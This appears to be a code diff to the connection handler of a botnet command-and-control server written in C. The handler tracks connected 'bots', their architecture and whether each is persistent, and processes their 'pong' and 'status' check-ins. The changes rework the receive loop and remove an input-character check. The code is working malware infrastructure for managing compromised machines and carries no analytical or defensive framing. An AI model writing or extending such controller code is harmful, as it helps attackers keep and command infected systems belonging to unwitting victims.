@@ -65,50 +65,59 @@ void* handle_bot(void* arg) {
     ev.events = EPOLLIN | EPOLLET;
     ev.data.fd = bot_socket;
     if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_socket, &ev) == -1) {
-        close(epoll_fd);
         pthread_mutex_lock(&bot_mutex);
         bots[bot_index].is_valid = 0;
         pthread_mutex_unlock(&bot_mutex);
         close(bot_socket);
+        close(epoll_fd);
         return NULL;
     }
 
-    char buffer[MAX_COMMAND_LENGTH] = {0};
-    ssize_t len;
-    while (1) {
-        struct epoll_event events[1];
-        int nfds = epoll_wait(epoll_fd, events, 1, 30000);
-        if (nfds > 0 && events[0].data.fd == bot_socket) {
-            memset(buffer, 0, sizeof(buffer));
-            len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
-            if (len <= 0) {
-                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
-                    continue;
+    struct epoll_event events[1];
+    int n, event_count;
+    char buffer[1024];
+    
+    while(1) {
+        event_count = epoll_wait(epoll_fd, events, 1, 1000);
+        if (event_count == -1) {
+            if (errno != EINTR) break;
+            continue;
+        }
+        
+        if (event_count > 0) {
+            n = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
+            if (n <= 0) break;
+            
+            buffer[n] = '\0';
+            
+            if (strncmp(buffer, "pong", 4) == 0) {
+                pthread_mutex_lock(&bot_mutex);
+                bots[bot_index].is_valid = 1;
+                pthread_mutex_unlock(&bot_mutex);
+            }
+            else if (strncmp(buffer, "status", 6) == 0) {
+                char arch[32];
+                int is_persistent;
+                
+                if (sscanf(buffer, "status %31s %d", arch, &is_persistent) == 2) {
+                    pthread_mutex_lock(&bot_mutex);
+                    bots[bot_index].is_persistent = is_persistent;
+                    bots[bot_index].status_reported = 1;
+                    pthread_mutex_unlock(&bot_mutex);
                 }
-                break;
             }
-            buffer[len] = 0;
-            if (strncmp(buffer, "ping", 4) == 0) {
-                char pong[64];
-                snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
-                send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
-                continue;
-            }
-            int valid = 1;
-            for (ssize_t i = 0; i < len; i++) {
-                if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
-                    valid = 0;
-                    break;
-                }
-            }
-            if (!valid) break;
+        }
+        
+        if (!check_bot_connection(bot_socket)) {
+            break;
         }
     }
-    close(epoll_fd);
+    
     pthread_mutex_lock(&bot_mutex);
     bots[bot_index].is_valid = 0;
     pthread_mutex_unlock(&bot_mutex);
     close(bot_socket);
+    close(epoll_fd);
     return NULL;
 }
 
